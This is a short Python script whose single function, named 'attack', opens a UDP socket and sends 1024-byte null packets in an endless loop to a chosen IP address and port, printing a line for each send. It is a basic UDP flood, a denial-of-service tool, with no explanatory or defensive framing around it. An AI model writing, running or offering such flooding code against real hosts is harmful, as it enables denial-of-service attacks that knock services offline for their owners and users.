import socket
import threading


def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'\x00' * 1024  #

    while True:
        client.sendto(bytes, (target_ip, target_port))
        print(f"Sending packets to {target_ip}:{target_port}")


